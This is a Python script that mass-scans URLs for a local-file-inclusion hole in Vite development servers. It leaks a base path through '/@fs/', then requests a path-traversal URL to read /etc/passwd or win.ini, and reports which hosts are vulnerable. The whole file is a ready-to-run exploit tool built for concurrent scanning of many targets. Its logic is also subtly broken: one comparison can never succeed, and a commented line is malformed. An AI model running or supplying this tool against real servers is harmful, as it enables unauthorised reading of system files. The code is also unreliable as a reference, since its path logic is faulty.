import re
import ssl
import json
import socket
import asyncio
import argparse
from urllib.parse import urlparse

results = []

async def send_raw_request(host, port, path, use_https=False):
    request = f"""GET {path} HTTP/1.1\r
Host: {host}\r
User-Agent: AsyncScanner/1.0\r
Accept: */*\r
Connection: close\r
\r
"""
    try:
        reader, writer = await asyncio.open_connection(
            host, port, ssl=ssl.create_default_context() if use_https else None
        )
        writer.write(request.encode())
        await writer.drain()
        response = b""
        while True:
            chunk = await reader.read(4096)
            if not chunk:
                break
            response += chunk
        writer.close()
        await writer.wait_closed()
        return response.decode(errors="ignore")
    except Exception as e:
        return f"[!] Error connecting to {host}:{port} - {e}"

def extract_base_path(body: str):
    match = re.search(r"- ([C:/]+[a-zA-Z0-9_/\\-]+)<br/><br/>", body)
    if match and "403 Restricted" in body:
        return match.group(1)
    return None

async def check_lfi(target_url: str, sem: asyncio.Semaphore):
    async with sem:
        parsed = urlparse(target_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_https = parsed.scheme == 'https'

        print(f"[*] Testing {target_url}")

        res = {
            "target": target_url,
            "base_path": None,
            "vulnerable": False
        }

        response = await send_raw_request(host, port, "/@fs/", use_https)
        base_path = extract_base_path(response)

        if not base_path:
            print(f"[-] {target_url}: Base path not found.")
            results.append(res)
            return

        print(f"[+] {target_url}: Base path = {base_path}")
        res["base_path"] = base_path

        #lfi_path = [if base_path[0] != "\" f"/@fs{base_path}/#/../../../../../../../../etc/passwd"]
        lfi_path = f"/@fs/{base_path}/#/{'../' * 20}{'etc/passwd' if base_path[0] == '//' else 'windows/win.ini'}"
        print(lfi_path)
        response = await send_raw_request(host, port, lfi_path, use_https)

        if ("root:" in response or "extensions" in response) and "200 OK" in response:
            print(f"\033[91m[!!] {target_url}: VULNERABLE to LFI!\033[0m")
            res["vulnerable"] = True
        else:
            print(f"[-] {target_url}: Not vulnerable.")

        results.append(res)

async def run_scanner(targets, concurrency=10):
    sem = asyncio.Semaphore(concurrency)
    tasks = [check_lfi(target, sem) for target in targets]
    await asyncio.gather(*tasks)

def run_main():
    parser = argparse.ArgumentParser(description="Async Vite LFI Scanner")
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-l", "--list", help="File with list of URLs")
    parser.add_argument("-c", "--concurrency", type=int, default=10, help="Concurrency level")
    parser.add_argument("-o", "--output", default=None, help="Output report file (JSON)")
    args = parser.parse_args()

    targets = []
    if args.url:
        targets.append(args.url.strip())
    elif args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        print("[-] You must provide either -u or -l")
        return

    try:
        asyncio.run(run_scanner(targets, args.concurrency))
    except RuntimeError:
        loop = asyncio.get_event_loop()
        loop.run_until_complete(run_scanner(targets, args.concurrency))

    if args.output:
        with open(args.output, "w") as out:
            json.dump(results, out, indent=2)
            print(f"\n[âœ“] Results saved to {args.output}")
    else:
        print("\n".join([json.dumps(res) for res in results]))

if __name__ == "__main__":
    run_main()

